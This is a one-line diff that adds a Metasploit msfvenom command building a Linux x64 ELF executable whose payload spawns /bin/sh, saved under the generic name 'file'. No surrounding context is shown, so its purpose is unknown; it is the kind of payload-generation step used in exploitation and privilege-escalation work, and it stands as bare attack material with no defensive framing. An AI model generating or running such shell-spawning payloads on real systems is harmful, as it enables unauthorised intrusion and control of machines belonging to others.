@@ -1,0 +1,1 @@
+msfvenom -p linux/x64/exec -f elf CMD=/bin/sh -o file
